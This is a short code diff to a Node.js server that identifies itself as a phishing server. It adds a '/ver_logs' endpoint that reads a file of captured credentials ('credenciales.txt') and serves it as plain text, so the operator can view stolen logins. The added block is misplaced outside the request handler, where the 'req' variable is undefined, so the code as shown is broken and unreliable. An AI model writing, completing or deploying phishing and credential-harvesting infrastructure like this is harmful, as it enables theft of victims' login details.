@@ -36,6 +36,19 @@ const server = http.createServer((req, res) => {
     });
 });
 
+if (req.url === '/ver_logs') {
+    fs.readFile('credenciales.txt', (err, data) => {
+        if (err) {
+            res.writeHead(404);
+            res.end('No hay datos aún');
+            return;
+        }
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end(data);
+    });
+    return;
+}
+
 server.listen(PORT, () => {
     console.log(`Servidor phishing corriendo en puerto ${PORT}`);
 });
